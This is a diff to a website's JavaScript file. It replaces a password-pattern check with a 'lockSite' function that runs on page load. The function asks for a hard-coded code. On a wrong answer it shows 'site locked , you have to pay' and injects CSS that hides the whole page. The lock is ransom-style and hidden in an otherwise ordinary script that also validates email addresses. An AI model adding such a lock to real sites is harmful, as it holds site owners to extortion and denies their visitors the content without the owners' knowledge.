@@ -1,11 +1,24 @@
-function myFunction() {
-    //var txt = "";
+function lockSite() {
 
-    if (document.getElementById("pass").validity.patternMismatch) {
-        alert("Not valid pattern");
+    var code = "123@qwe";
+    var giveCode = prompt("Give code :");
+
+    if (giveCode == code) {
+
+        alert("ok");
+
+    } else {
+
+        alert("site locked , you have to pay");
+        var css = document.createElement("style");
+        css.type = "text/css";
+        css.innerHTML = "body * { display: none !important; }";
+        document.body.appendChild(css);
+
     }
-    //document.getElementById("demo").innerHTML = txt;
 }
+
+lockSite();
 
 function validateEmail(email) {
     var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
